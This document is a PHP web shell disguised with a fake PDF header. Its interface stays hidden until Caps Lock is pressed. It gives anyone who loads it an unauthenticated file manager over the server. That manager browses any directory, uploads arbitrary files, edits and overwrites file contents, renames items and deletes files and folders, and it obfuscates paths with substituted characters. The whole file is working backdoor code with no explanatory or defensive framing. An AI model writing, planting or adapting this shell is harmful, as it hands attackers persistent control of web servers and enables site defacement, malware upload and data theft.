%PDF-1.7
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>nyan</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 0;
        }

        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: #e3f2fd;
            padding: 10px;
        }

        .navbar a {
            text-decoration: none;
            color: #000;
            margin: 0 10px;
        }

        .navbar .btn {
            padding: 5px 10px;
            background-color: #333;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        .navbar .btn:hover {
            background-color: #555;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }

        table,
        th,
        td {
            border: 1px solid #ddd;
        }

        th,
        td {
            padding: 8px;
            text-align: left;
        }

        th {
            background-color: #f2f2f2;
        }

        .form-inline {
            display: flex;
            justify-content: flex-end;
            align-items: center;
        }

        .form-inline button {
            margin-left: 10px;
        }

        form {
            margin: 20px;
        }

        form input[type="text"],
        form input[type="file"],
        form textarea {
            width: calc(100% - 20px);
            padding: 8px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        form input[type="submit"] {
            background-color: #333;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            padding: 10px 20px;
        }

        form input[type="submit"]:hover {
            background-color: #555;
        }

        .icon {
            margin-right: 5px;
        }

        .kerang-content {
            display: none;
        }
    </style>
    <script>
        function checkCapsLock(event) {
            if (event.getModifierState('CapsLock')) {
                sessionStorage.setItem('capsLockActive', 'true');
                document.querySelector('.kerang-content').style.display = 'block';
                document.querySelector('.capslock-message').style.display = 'none';
            }
        }

        document.addEventListener('DOMContentLoaded', function () {
            if (sessionStorage.getItem('capsLockActive') === 'true') {
                document.querySelector('.kerang-content').style.display = 'block';
                document.querySelector('.capslock-message').style.display = 'none';
            } else {
                document.addEventListener('keydown', checkCapsLock);
            }
        });
    </script>
</head>

<body>
    <div class="capslock-message">
        <p></p>
    </div>
    <div class="kerang-content">
        <?php
        //function
        function formatSizeUnits($bytes)
        {
            if ($bytes >= 1073741824) {
                $bytes = number_format($bytes / 1073741824, 2) . ' GB';
            } elseif ($bytes >= 1048576) {
                $bytes = number_format($bytes / 1048576, 2) . ' MB';
            } elseif ($bytes >= 1024) {
                $bytes = number_format($bytes / 1024, 2) . ' KB';
            } elseif ($bytes > 1) {
                $bytes = $bytes . ' bytes';
            } elseif ($bytes == 1) {
                $bytes = $bytes . ' byte';
            } else {
                $bytes = '0 bytes';
            }
            return $bytes;
        }

        function fileExtension($file)
        {
            return substr(strrchr($file, '.'), 1);
        }

        function fileIcon($file)
        {
            $imgs = array("apng", "avif", "gif", "jpg", "jpeg", "jfif", "pjpeg", "pjp", "png", "svg", "webp");
            $audio = array("wav", "m4a", "m4b", "mp3", "ogg", "webm", "mpc");
            $ext = strtolower(fileExtension($file));
            if ($file == "error_log") {
                return '<span class="icon">🐞</span>';
            } elseif ($file == ".htaccess") {
                return '<span class="icon">🔧</span>';
            }
            if ($ext == "html" || $ext == "htm") {
                return '<span class="icon">📄</span>';
            } elseif ($ext == "php" || $ext == "phtml") {
                return '<span class="icon">📜</span>';
            } elseif (in_array($ext, $imgs)) {
                return '<span class="icon">🖼️</span>';
            } elseif ($ext == "css") {
                return '<span class="icon">🎨</span>';
            } elseif ($ext == "txt") {
                return '<span class="icon">📄</span>';
            } elseif (in_array($ext, $audio)) {
                return '<span class="icon">🎵</span>';
            } elseif ($ext == "py") {
                return '<span class="icon">🐍</span>';
            } elseif ($ext == "js") {
                return '<span class="icon">📜</span>';
            } else {
                return '<span class="icon">📁</span>';
            }
        }

        function encodePath($path)
        {
            $a = array("/", "\\", ".", ":");
            $b = array("ক", "খ", "গ", "ঘ");
            return str_replace($a, $b, $path);
        }
        function decodePath($path)
        {
            $a = array("/", "\\", ".", ":");
            $b = array("ক", "খ", "গ", "ঘ");
            return str_replace($b, $a, $path);
        }

        $root_path = __DIR__;
        if (isset($_GET['p'])) {
            if (empty($_GET['p'])) {
                $p = $root_path;
            } elseif (!is_dir(decodePath($_GET['p']))) {
                echo ("<script>\nalert('Directory is Corrupted and Unreadable.');\nwindow.location.replace('?');\n</script>");
            } elseif (is_dir(decodePath($_GET['p']))) {
                $p = decodePath($_GET['p']);
            }
        } elseif (isset($_GET['q'])) {
            if (!is_dir(decodePath($_GET['q']))) {
                echo ("<script>window.location.replace('?p=');</script>");
            } elseif (is_dir(decodePath($_GET['q']))) {
                $p = decodePath($_GET['q']);
            }
        } else {
            $p = $root_path;
        }
        define("PATH", $p);

        echo ('
<nav class="navbar">
  <div>
  <a href="?"><img src="https://github.com/fluidicon.png" width="30" height="30" alt=""></a>
');

        $path = str_replace('\\', '/', PATH);
        $paths = explode('/', $path);
        foreach ($paths as $id => $dir_part) {
            if ($dir_part == '' && $id == 0) {
                $a = true;
                echo "<a href=\"?p=/\">/</a>";
                continue;
            }
            if ($dir_part == '')
                continue;
            echo "<a href='?p=";
            for ($i = 0; $i <= $id; $i++) {
                echo str_replace(":", "ঘ", $paths[$i]);
                if ($i != $id)
                    echo "ক";
            }
            echo "'>" . $dir_part . "</a>/";
        }
        echo ('
</div>
<div class="form-inline">
<a href="?upload&q=' . urlencode(encodePath(PATH)) . '"><button class="btn">Upload File</button></a>
<a href="?"><button type="button" class="btn">HOME</button></a> 
</div>
</nav>');

        if (isset($_GET['p'])) {

            //fetch files
            if (is_readable(PATH)) {
                $fetch_obj = scandir(PATH);
                $folders = array();
                $files = array();
                foreach ($fetch_obj as $obj) {
                    if ($obj == '.' || $obj == '..') {
                        continue;
                    }
                    $new_obj = PATH . '/' . $obj;
                    if (is_dir($new_obj)) {
                        array_push($folders, $obj);
                    } else if (is_file($new_obj)) {
                        array_push($files, $obj);
                    }
                }
            }
            echo '
<table>
  <thead>
    <tr>
      <th scope="col">Name</th>
      <th scope="col">Size</th>
      <th scope="col">Modified</th>
      <th scope="col">Perms</th>
      <th scope="col">Actions</th>
    </tr>
  </thead>
  <tbody>
';
            foreach ($folders as $folder) {
                echo "    <tr>
      <td><span class='icon'>📁</span> <a href='?p=" . urlencode(encodePath(PATH . "/" . $folder)) . "'>" . $folder . "</a></td>
      <td><b>---</b></td>
      <td>" . date("F d Y H:i:s.", filemtime(PATH . "/" . $folder)) . "</td>
      <td>0" . substr(decoct(fileperms(PATH . "/" . $folder)), -3) . "</a></td>
      <td>
      <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $folder . "'>✏️</a>
      <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $folder . "'>🗑️</a>
      <td>
    </tr>
";
            }
            foreach ($files as $file) {
                echo "    <tr>
          <td>" . fileIcon($file) . $file . "</td>
          <td>" . formatSizeUnits(filesize(PATH . "/" . $file)) . "</td>
          <td>" . date("F d Y H:i:s.", filemtime(PATH . "/" . $file)) . "</td>
          <td>0" . substr(decoct(fileperms(PATH . "/" . $file)), -3) . "</a></td>
          <td>
          <a title='Edit File' href='?q=" . urlencode(encodePath(PATH)) . "&e=" . $file . "'>✏️</a>
          <a title='Rename' href='?q=" . urlencode(encodePath(PATH)) . "&r=" . $file . "'>✏️</a>
          <a title='Delete' href='?q=" . urlencode(encodePath(PATH)) . "&d=" . $file . "'>🗑️</a>
          <td>
    </tr>
";
            }
            echo "  </tbody>
</table>";
        } else {
            if (empty($_GET)) {
                echo ("<script>window.location.replace('?p=');</script>");
            }
        }
        if (isset($_GET['upload'])) {
            echo '
    <form method="post" enctype="multipart/form-data">
        Select file to upload:
        <input type="file" name="fileToUpload" id="fileToUpload">
        <input type="submit" class="btn" value="Upload" name="upload">
    </form>';
        }
        if (isset($_GET['r'])) {
            if (!empty($_GET['r']) && isset($_GET['q'])) {
                echo '
    <form method="post">
        Rename:
        <input type="text" name="name" value="' . $_GET['r'] . '">
        <input type="submit" class="btn" value="Rename" name="rename">
    </form>';
                if (isset($_POST['rename'])) {
                    $name = PATH . "/" . $_GET['r'];
                    if (rename($name, PATH . "/" . $_POST['name'])) {
                        echo ("<script>alert('Renamed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                    } else {
                        echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                    }
                }
            }
        }

        if (isset($_GET['e'])) {
            if (!empty($_GET['e']) && isset($_GET['q'])) {
                echo '
    <form method="post">
        <textarea style="height: 500px;" name="data">' . htmlspecialchars(file_get_contents(PATH . "/" . $_GET['e'])) . '</textarea>
        <br>
        <input type="submit" class="btn" value="Save" name="edit">
    </form>';

                if (isset($_POST['edit'])) {
                    $filename = PATH . "/" . $_GET['e'];
                    $data = $_POST['data'];
                    $open = fopen($filename, "w");
                    if (fwrite($open, $data)) {
                        echo ("<script>alert('Saved.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                    } else {
                        echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                    }
                    fclose($open);
                }
            }
        }

        if (isset($_POST["upload"])) {
            $target_file = PATH . "/" . $_FILES["fileToUpload"]["name"];
            if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
                echo "<p>" . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded.</p>";
            } else {
                echo "<p>Sorry, there was an error uploading your file.</p>";
            }
        }
        if (isset($_GET['d']) && isset($_GET['q'])) {
            $name = PATH . "/" . $_GET['d'];
            if (is_file($name)) {
                if (unlink($name)) {
                    echo ("<script>alert('File removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                }
            } elseif (is_dir($name)) {
                if (rmdir($name) == true) {
                    echo ("<script>alert('Directory removed.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                }
            }
        }
        ?>
    </div>
</body>

</html>
